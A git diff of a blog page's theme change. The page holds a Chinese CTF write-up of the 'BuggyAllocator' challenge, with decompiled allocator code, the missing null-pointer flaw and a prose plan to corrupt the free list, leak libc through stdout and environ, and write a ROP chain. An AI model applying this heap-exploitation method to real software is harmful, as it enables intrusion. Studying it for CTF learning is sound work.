@@ -1,507 +1,452 @@
-<!DOCTYPE html>
-<html lang="en">
-    <!-- title -->
-
-
-    
-
-<!-- keywords -->
-
-
-
+<!DOCTYPE HTML>
+<html>
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <meta name="author" content="nyyyddddn">
-    <meta name="renderer" content="webkit">
-    <meta name="copyright" content="nyyyddddn">
-    
-        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
-    
-    <meta name="description" content="">
-    <meta name="description" content="xctf_BuggyAllocator复现程序有 alloc 和dealloc两个选项 123456789101112131415161718192021222324252627282930313233343536373839404142__int64 menu()&amp;#123;  __int64 v0; &#x2F;&#x2F; rax  __int64 v1; &#x2F;&#x2F; rax  __int64 v2; &#x2F;&#x2F; rax">
-<meta property="og:type" content="article">
-<meta property="og:title" content="xctf_BuggyAllocator复现">
-<meta property="og:url" content="https://nyyyddddn.github.io/2024/05/30/xctf-BuggyAllocator%E5%A4%8D%E7%8E%B0/index.html">
-<meta property="og:site_name" content="nyyyddddn">
-<meta property="og:description" content="xctf_BuggyAllocator复现程序有 alloc 和dealloc两个选项 123456789101112131415161718192021222324252627282930313233343536373839404142__int64 menu()&amp;#123;  __int64 v0; &#x2F;&#x2F; rax  __int64 v1; &#x2F;&#x2F; rax  __int64 v2; &#x2F;&#x2F; rax">
-<meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2024-05-30T09:22:56.000Z">
-<meta property="article:modified_time" content="2024-05-30T09:24:12.392Z">
-<meta property="article:author" content="nyyyddddn">
-<meta property="article:tag" content="ctf writeup">
-<meta name="twitter:card" content="summary">
-    <meta http-equiv="Cache-control" content="no-cache">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <link rel="icon" href="/null">
-    
-    <title>xctf_BuggyAllocator复现 · nyyyddddn&#39;s blog</title>
-    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
-/* This file is meant as a standalone workflow for
-- testing support for link[rel=preload]
-- enabling async CSS loading in browsers that do not support rel=preload
-- applying rel preload css once loaded, whether supported or not.
-*/ -->
-<script>
-    (function (w) {
-        'use strict'
-        // rel=preload support test
-        if (!w.loadCSS) {
-            w.loadCSS = function () {}
-        }
-        // define on the loadCSS obj
-        var rp = (loadCSS.relpreload = {})
-        // rel=preload feature support test
-        // runs once and returns a function for compat purposes
-        rp.support = (function () {
-            var ret
-            try {
-                ret = w.document.createElement('link').relList.supports('preload')
-            } catch (e) {
-                ret = false
-            }
-            return function () {
-                return ret
-            }
-        })()
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>xctf_BuggyAllocator复现 | nyyyddddn</title>
+  <meta name="author" content="nyyyddddn">
+  
+  <meta name="description" content="xctf_BuggyAllocator复现程序有 alloc 和dealloc两个选项
+__int64 menu()
+&amp;#123;
+  __int64 v0; // rax
+  __int64 v1; // rax
+  __int64 v2; // rax
 
-        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
-        // then change that media back to its intended value on load
-        rp.bindMediaToggle = function (link) {
-            // remember existing media attr for ultimate state, or default to 'all'
-            var finalMedia = link.media || 'all'
+  v0 = std::operator&amp;lt;&amp;lt;&amp;lt;std::char_traits&amp;lt;char&gt;&gt;(&amp;amp;std::cout, &#34;*** Buggy  Allocator***&#34;);
+  std::ostream::operator&amp;lt;&amp;lt;(v0, &amp;amp;std::endl&amp;lt;char,std::char_traits&amp;lt;char&gt;&gt;);
+  v1 = std::operator&amp;lt;&amp;lt;&amp;lt;std::char_traits&amp;lt;char&gt;&gt;(&amp;amp;std::cout, &#34;***     1. Alloc    ***&#34;);
+  std::ostream::operator&amp;lt;&amp;lt;(v1, &amp;amp;std::endl&amp;lt;char,std::char_traits&amp;lt;char&gt;&gt;);
+  v2 = std::operator&amp;lt;&amp;lt;&amp;lt;std::char_traits&amp;lt;char&gt;&gt;(&amp;amp;std::cout, &#34;***     2. Dealloc  ***&#34;);
+  std::ostream::operator&amp;lt;&amp;lt;(v2, &amp;amp;std::endl&amp;lt;char,std::char_traits&amp;lt;char&gt;&gt;);
+  return std::operator&amp;lt;&amp;lt;&amp;lt;std::char_traits&amp;lt;char&gt;&gt;(&amp;amp;std::cout, &#34;&gt; &#34;);
+&amp;#125;
 
-            function enableStylesheet() {
-                link.media = finalMedia
-            }
+void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
+&amp;#123;
+  __int64 v3; // rax
+  int choice; // [rsp+4h] [rbp-Ch] BYREF
+  unsigned __int64 v5; // [rsp+8h] [rbp-8h]
 
-            // bind load handlers to enable media
-            if (link.addEventListener) {
-                link.addEventListener('load', enableStylesheet)
-            } else if (link.attachEvent) {
-                link.attachEvent('onload', enableStylesheet)
-            }
+  v5 = __readfsqword(0x28u);
+  sub_4019D7(a1, a2, a3);
+  while ( 1 )
+  &amp;#123;
+    while ( 1 )
+    &amp;#123;
+      menu();
+      std::istream::operator&gt;&gt;(&amp;amp;std::cin, &amp;amp;choice);
+      if ( choice != 1 )
+        break;
+      add();
+    &amp;#125;
+    if ( choice != 2 )
+    &amp;#123;
+      v3 = std::operator&amp;lt;&amp;lt;&amp;lt;std::char_traits&amp;lt;char&gt;&gt;(&amp;amp;std::cout, &#34;Invalid Choice&#34;);
+      std::ostream::operator&amp;lt;&amp;lt;(v3, &amp;amp;std::endl&amp;lt;char,std::char_traits&amp;lt;char&gt;&gt;);
+      exit(0);
+    &amp;#125;
+    delete();
+  &amp;#125;
+&amp;#125;
 
-            // Set rel and non-applicable media type to start an async request
-            // note: timeout allows this to happen async to let rendering continue in IE
-            setTimeout(function () {
-                link.rel = 'stylesheet'
-                link.media = 'only x'
-            })
-            // also enable media after 3 seconds,
-            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
-            setTimeout(enableStylesheet, 3000)
-        }
+，其中alloc申请大于 0x80 会使用malloc函数分配内存(ptmalloc2)，小于等于 0x80会使用自定义的堆管理器去分配内存
+_QWORD *__fastcall alloc_memory(size_t size)
+&amp;#123;
+  __int64 v2; &amp;#x2F;&amp;#x2F; rax
+  _QWORD **v3; &amp;#x2F;&amp;#x2F; [rsp+18h] [rbp-18h]
+  _QWORD *v4; &amp;#x2F;&amp;#x2F; [rsp+20h] [rbp-10h]
 
-        // loop through link elements in DOM
-        rp.poly = function () {
-            // double check this to prevent external calls from running
-            if (rp.support()) {
-                return
-            }
-            var links = w.document.getElementsByTagName('link')
-            for (var i = 0; i < links.length; i++) {
-                var link = links[i]
-                // qualify links to those with rel=preload and as=style attrs
-                if (
-                    link.rel === 'preload' &&
-                    link.getAttribute('as') === 'style' &&
-                    !link.getAttribute('data-loadcss')
-                ) {
-                    // prevent rerunning on link
-                    link.setAttribute('data-loadcss', true)
-                    // bind listeners to toggle media back
-                    rp.bindMediaToggle(link)
-                }
-            }
-        }
+  if ( !size )
+    return 0LL;
+  if ( size &amp;gt; 0x80 )
+    return malloc_(size);
+  v3 &amp;#x3D; (_QWORD **)&amp;amp;free_list[get_idx(size)];
+  v4 &amp;#x3D; *v3;
+  if ( *v3 )
+  &amp;#123;
+    *v3 &amp;#x3D; (_QWORD *)*v4;
+    return v4;
+  &amp;#125;
+  else
+  &amp;#123;
+    v2 &amp;#x3D; Alignment_size(size);
+    return refill(v2);
+  &amp;#125;
+&amp;#125;
 
-        // if unsupported, run the polyfill
-        if (!rp.support()) {
-            // run once at least
-            rp.poly()
+自定义的堆管理器维护一个free_list，申请内存的时候，当free list中没有申请大小的堆块时，就会调用refill 填充空闲区域(arena_end - arena_start)，填充完后free list中拿，当空闲区域不够refill的时候会判断free list中有没有更大的堆块可以进行refill，如果都不满足会调用malloc申请名称
+_QWORD *__fastcall refill(unsigned __int64 size)
+&amp;#123;
+  int nobjs; &amp;#x2F;&amp;#x2F; [rsp+18h] [rbp-38h] BYREF
+  int i; &amp;#x2F;&amp;#x2F; [rsp+1Ch] [rbp-34h]
+  _QWORD *current_obj; &amp;#x2F;&amp;#x2F; [rsp+20h] [rbp-30h]
+  _QWORD *v5; &amp;#x2F;&amp;#x2F; [rsp+28h] [rbp-28h]
+  _QWORD *my_free_list; &amp;#x2F;&amp;#x2F; [rsp+30h] [rbp-20h]
+  _QWORD *v7; &amp;#x2F;&amp;#x2F; [rsp+38h] [rbp-18h]
+  _QWORD *next_obj; &amp;#x2F;&amp;#x2F; [rsp+40h] [rbp-10h]
+  unsigned __int64 v9; &amp;#x2F;&amp;#x2F; [rsp+48h] [rbp-8h]
 
-            // rerun poly on an interval until onload
-            var run = w.setInterval(rp.poly, 500)
-            if (w.addEventListener) {
-                w.addEventListener('load', function () {
-                    rp.poly()
-                    w.clearInterval(run)
-                })
-            } else if (w.attachEvent) {
-                w.attachEvent('onload', function () {
-                    rp.poly()
-                    w.clearInterval(run)
-                })
-            }
-        }
+  v9 &amp;#x3D; __readfsqword(0x28u);
+  nobjs &amp;#x3D; 20;
+  v5 &amp;#x3D; (_QWORD *)chunk_alloc(size, &amp;amp;nobjs);
+  if ( nobjs &amp;#x3D;&amp;#x3D; 1 )
+    return v5;
+  my_free_list &amp;#x3D; &amp;amp;free_list[get_idx(size)];
+  v7 &amp;#x3D; v5;
+  current_obj &amp;#x3D; v5;
+  *my_free_list &amp;#x3D; (char *)v5 + size;
+  for ( i &amp;#x3D; 0; i !&amp;#x3D; nobjs - 1; ++i )
+  &amp;#123;
+    next_obj &amp;#x3D; (_QWORD *)((char *)current_obj + size);
+    *current_obj &amp;#x3D; (char *)current_obj + size;
+    current_obj &amp;#x3D; next_obj;
+  &amp;#125;
+  return v7;
+&amp;#125;
 
-        // commonjs
-        if (typeof exports !== 'undefined') {
-            exports.loadCSS = loadCSS
-        } else {
-            w.loadCSS = loadCSS
-        }
-    })(typeof global !== 'undefined' ? global : this)
-</script>
+_QWORD *__fastcall chunk_alloc(unsigned __int64 size, int *nobjs)
+&amp;#123;
+  unsigned __int64 idx; &amp;#x2F;&amp;#x2F; rax
+  int i; &amp;#x2F;&amp;#x2F; [rsp+14h] [rbp-3Ch]
+  unsigned __int64 all_size; &amp;#x2F;&amp;#x2F; [rsp+18h] [rbp-38h]
+  unsigned __int64 available_size; &amp;#x2F;&amp;#x2F; [rsp+20h] [rbp-30h]
+  _QWORD *arena_start_ptr; &amp;#x2F;&amp;#x2F; [rsp+28h] [rbp-28h]
+  size_t v8; &amp;#x2F;&amp;#x2F; [rsp+38h] [rbp-18h]
+  _QWORD **v9; &amp;#x2F;&amp;#x2F; [rsp+40h] [rbp-10h]
+  _QWORD *v10; &amp;#x2F;&amp;#x2F; [rsp+48h] [rbp-8h]
 
-    <style type="text/css">
-    @font-face {
-        font-family: 'Oswald-Regular';
-        src: url("/font/Oswald-Regular.ttf");
-    }
+  all_size &amp;#x3D; size * *nobjs;
+  available_size &amp;#x3D; arena_end - arena_start;
+  arena_start_ptr &amp;#x3D; (_QWORD *)arena_start;
+  if ( all_size &amp;gt; arena_end - arena_start )
+  &amp;#123;
+    if ( available_size &amp;lt; size )
+    &amp;#123;
+      if ( available_size )
+      &amp;#123;
+        arena_start &amp;#x3D; arena_end;
+        idx &amp;#x3D; get_idx(available_size);
+        *arena_start_ptr &amp;#x3D; free_list[idx];
+        free_list[idx] &amp;#x3D; arena_start_ptr;
+      &amp;#125;
+      v8 &amp;#x3D; 2 * all_size;
+      for ( i &amp;#x3D; size; i &amp;lt;&amp;#x3D; 128; i +&amp;#x3D; 8 )
+      &amp;#123;
+        v9 &amp;#x3D; (_QWORD **)&amp;amp;free_list[get_idx(i)];
+        v10 &amp;#x3D; *v9;
+        if ( *v9 )
+        &amp;#123;
+          *v9 &amp;#x3D; (_QWORD *)*v10;
+          arena_start &amp;#x3D; (__int64)v10;
+          arena_end &amp;#x3D; (__int64)v10 + i;
+          return chunk_alloc(size, nobjs);
+        &amp;#125;
+      &amp;#125;
+      arena_end &amp;#x3D; 0LL;
+      arena_start &amp;#x3D; (__int64)malloc_(v8);
+      arena_end &amp;#x3D; arena_start + v8;
+      return chunk_alloc(size, nobjs);
+    &amp;#125;
+    else
+    &amp;#123;
+      *nobjs &amp;#x3D; available_size &amp;#x2F; size;
+      arena_start +&amp;#x3D; size * *nobjs;
+      return arena_start_ptr;
+    &amp;#125;
+  &amp;#125;
+  else
+  &amp;#123;
+    arena_start +&amp;#x3D; all_size;
+    return arena_start_ptr;
+  &amp;#125;
+&amp;#125;
 
-    body {
-        margin: 0;
-    }
+存在漏洞的地方是建立链表的时候不会将最后一个obj的next指针置空，可以通过堆块上残留的数据伪造一个指针破坏链表，实现任意地址分配
+for ( i &amp;#x3D; 0; i !&amp;#x3D; nobjs - 1; ++i )
+&amp;#123;
+  next_obj &amp;#x3D; (_QWORD *)((char *)current_obj + size);
+  *current_obj &amp;#x3D; (char *)current_obj + size;
+  current_obj &amp;#x3D; next_obj;
+&amp;#125;
 
-    header,
-    footer,
-    .back-top,
-    .sidebar,
-    .container,
-    .site-intro-meta,
-    .toc-wrapper {
-        display: none;
-    }
+利用的思路是，首先申请大量的堆块，使arena_end - arena_start尽可能的小，这样申请小块内存的时候,建立freelist,会优先从free list中的大堆块中建立，而不是从后面空闲内存那建立，利用大堆块中残留的数据伪造next指针破坏freelist实现任意地址写，写IO_2_1_stdout 通过puts的利用链将libc的地址泄露出来后，再通过environ泄露栈地址，最后写rop"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-    .site-intro {
-        position: relative;
-        z-index: 3;
-        width: 100%;
-        /* height: 50vh; */
-        overflow: hidden;
-    }
+  <meta property="og:title" content="xctf_BuggyAllocator复现"/>
+  <meta property="og:site_name" content="nyyyddddn"/>
 
-    .site-intro-placeholder {
-        position: absolute;
-        z-index: -2;
-        top: 0;
-        left: 0;
-        width: calc(100% + 300px);
-        height: 100%;
-        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
-        background-position: center center;
-        transform: translate3d(-226px, 0, 0);
-        animation: gradient-move 2.5s ease-out 0s infinite;
-    }
+  
+    <meta property="og:image" content=""/>
+  
 
-    @keyframes gradient-move {
-        0% {
-            transform: translate3d(-226px, 0, 0);
-        }
-        100% {
-            transform: translate3d(0, 0, 0);
-        }
-    }
-</style>
+  
+    <link rel="alternative" href="/atom.xml" title="nyyyddddn" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
 
-    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
-    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
-    <link rel="stylesheet" href="/css/dark.css">
-    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
-    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
-    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
-    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
-    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
-    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
-    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
-    <!-- algolia -->
-    
-    <!-- 百度统计  -->
-    
-    <!-- 谷歌统计  -->
-    
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
 <meta name="generator" content="Hexo 6.3.0"></head>
 
-    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
-    <script type="text/javascript">
-        if (typeof window.$ == undefined) {
-            console.warn('jquery load from jsdelivr failed, will load local script')
-            document.write('<script src="/lib/jquery.min.js" />')
-        }
-    </script>
-    
-        <body class="post-body">
-    
-        <!-- header -->
-        <header class="header header-mobile">
-    <!-- top read progress line -->
-    <div class="header-element">
-        <div class="read-progress"></div>
-    </div>
-    <!-- sidebar menu button -->
-    <div class="header-element">
-        
-            <div class="header-sidebar-menu">
-        
-            
-                <div style="padding-left: 1px;">&#xe775;</div>
-            
-        </div>
-    </div>
-    <!-- header actions -->
-    <div class="header-actions">
-        <!-- theme mode switch button -->
-        <span class="header-theme-btn header-element">
-            <i class="fas fa-adjust"></i>
-        </span>
-        <!-- back to home page text -->
-        <span class="home-link header-element">
-            <a href=/>nyyyddddn</a>
-        </span>
-    </div>
-    <!-- toggle banner for post layout -->
-    
-        
-            <div class="banner">
-        
-            <div class="blog-title header-element">
-                <a href="/">nyyyddddn</a>
-            </div>
-            <div class="post-title header-element">
-                <a href="#" class="post-name">xctf_BuggyAllocator复现</a>
-            </div>
-        </div>
-    
-</header>
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">nyyyddddn</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/catergories" title="All the catergories.">
+			  <i class=""></i>Catergories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
 
-        <!-- fixed footer -->
-        <footer class="footer-fixed">
-    <!-- back to top button -->
-    <div class="footer-fixed-element">
-        
-            <div class="back-top back-top-hidden">
-        
-        
-            <div>&#xe639;</div>
-        
-        </div>
-    </div>
-</footer>
+  <div class="container">
+  	<div class="content">
+    	 
 
-        <!-- wrapper -->
-        <div class="wrapper">
-            <div class="site-intro" style="
+
+	
+		<div class="page-header">
+			<h1> xctf_BuggyAllocator复现</h1>
+		</div>
+	
 
 
 
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
 
+	<!-- content -->
+	<div class="mypage">		
+	  		
 
+	  <h2 id="xctf-BuggyAllocator复现"><a href="#xctf-BuggyAllocator复现" class="headerlink" title="xctf_BuggyAllocator复现"></a>xctf_BuggyAllocator复现</h2><p>程序有 alloc 和dealloc两个选项</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  __int64 v0<span class="token punctuation">;</span> <span class="token comment">// rax</span>
+  __int64 v1<span class="token punctuation">;</span> <span class="token comment">// rax</span>
+  __int64 v2<span class="token punctuation">;</span> <span class="token comment">// rax</span>
 
+  v0 <span class="token operator">=</span> std<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"*** Buggy  Allocator***"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  std<span class="token operator">::</span>ostream<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>v0<span class="token punctuation">,</span> <span class="token operator">&amp;</span>std<span class="token operator">::</span>endl<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v1 <span class="token operator">=</span> std<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"***     1. Alloc    ***"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  std<span class="token operator">::</span>ostream<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>std<span class="token operator">::</span>endl<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v2 <span class="token operator">=</span> std<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"***     2. Dealloc  ***"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  std<span class="token operator">::</span>ostream<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>v2<span class="token punctuation">,</span> <span class="token operator">&amp;</span>std<span class="token operator">::</span>endl<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> std<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
 
-    height:50vh;
+<span class="token keyword">void</span> __fastcall __noreturn <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// rax</span>
+  <span class="token keyword">int</span> choice<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch] BYREF</span>
+  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>
 
-">
-    
-    <!-- 主页  -->
-    
-        
-    <!-- 404页  -->
-    
-    <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
-    <div class="site-intro-meta">
-        <!-- 标题  -->
-        <h1 class="intro-title">
-            <!-- 主页  -->
-            
-                xctf_BuggyAllocator复现
-            <!-- 404 -->
-            
-        </h1>
-        <!-- 副标题 -->
-        <p class="intro-subtitle">
-            <!-- 主页副标题  -->
-            
-                
-            <!-- 404 -->
-            
-        </p>
-        <!-- 文章页 meta -->
-        
-            <div class="post-intros">
-                <!-- 文章页标签  -->
-                
-                    <div class= post-intro-tags >
-    
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="ctf writeup">ctf writeup</a>
-    
-</div>
-
-                
-                <!-- 文章字数统计 -->
-                
-                <div class="post-intro-meta">
-                    <!-- 撰写日期 -->
-                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
-                    <span class="post-intro-time">2024/05/30</span>
-                    <!-- busuanzi -->
-                    
-                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
-                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
-                            <span id="busuanzi_value_page_pv"></span>
-                        </span>
-                    
-                    <!-- 文章分享 -->
-                    <span class="share-wrapper">
-                        <span class="iconfont-archer share-icon">&#xe71d;</span>
-                        <span class="share-text">Share</span>
-                        <ul class="share-list">
-                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
-                                <div class="share-qrcode"></div>
-                            </li>
-                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
-                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
-                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
-                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
-                        </ul>
-                    </span>
-                </div>
-            </div>
-        
-    </div>
-</div>
-
-            <script>
-  // get user agent
-  function getBrowserVersions() {
-    var u = window.navigator.userAgent
-    return {
-      userAgent: u,
-      trident: u.indexOf('Trident') > -1, //IE内核
-      presto: u.indexOf('Presto') > -1, //opera内核
-      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
-      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
-      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
-      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
-      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
-      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
-      iPad: u.indexOf('iPad') > -1, //是否为iPad
-      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
-      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
-      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
-    }
-  }
-  var browser = {
-    versions: getBrowserVersions(),
-  }
-  console.log('userAgent: ' + browser.versions.userAgent)
-
-  // callback
-  function fontLoaded() {
-    console.log('font loaded')
-    if (document.getElementsByClassName('site-intro-meta')) {
-      document
-        .getElementsByClassName('intro-title')[0]
-        .classList.add('intro-fade-in')
-      document
-        .getElementsByClassName('intro-subtitle')[0]
-        .classList.add('intro-fade-in')
-      var postIntros = document.getElementsByClassName('post-intros')[0]
-      if (postIntros) {
-        postIntros.classList.add('post-fade-in')
-      }
-    }
-  }
-
-  // UC不支持跨域，所以直接显示
-  function asyncCb() {
-    if (browser.versions.uc) {
-      console.log('UCBrowser')
-      fontLoaded()
-    } else {
-      WebFont.load({
-        custom: {
-          families: ['Oswald-Regular'],
-        },
-        loading: function () {
-          // 所有字体开始加载
-          // console.log('font loading');
-        },
-        active: function () {
-          // 所有字体已渲染
-          fontLoaded()
-        },
-        inactive: function () {
-          // 字体预加载失败，无效字体或浏览器不支持加载
-          console.log('inactive: timeout')
-          fontLoaded()
-        },
-        timeout: 5000, // Set the timeout to two seconds
-      })
-    }
-  }
-
-  function asyncErr() {
-    console.warn('script load from CDN failed, will load local script')
-  }
-
-  // load webfont-loader async, and add callback function
-  function async(u, cb, err) {
-    var d = document,
-      t = 'script',
-      o = d.createElement(t),
-      s = d.getElementsByTagName(t)[0]
-    o.src = u
-    if (cb) {
-      o.addEventListener(
-        'load',
-        function (e) {
-          cb(null, e)
-        },
-        false
-      )
-    }
-    if (err) {
-      o.addEventListener(
-        'error',
-        function (e) {
-          err(null, e)
-        },
-        false
-      )
-    }
-    s.parentNode.insertBefore(o, s)
-  }
-
-  var asyncLoadWithFallBack = function (arr, success, reject) {
-    var currReject = function () {
-      reject()
-      arr.shift()
-      if (arr.length) async(arr[0], success, currReject)
-    }
-
-    async(arr[0], success, currReject)
-  }
-
-  asyncLoadWithFallBack(
-    [
-      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
-      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
-      "/lib/webfontloader.min.js",
-    ],
-    asyncCb,
-    asyncErr
-  )
-</script>
-
-            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
-            <div class="container container-unloaded">
-                <main class="main post-page">
-    <article class="article-entry">
-        <h2 id="xctf-BuggyAllocator复现"><a href="#xctf-BuggyAllocator复现" class="headerlink" title="xctf_BuggyAllocator复现"></a>xctf_BuggyAllocator复现</h2><p>程序有 alloc 和dealloc两个选项</p>
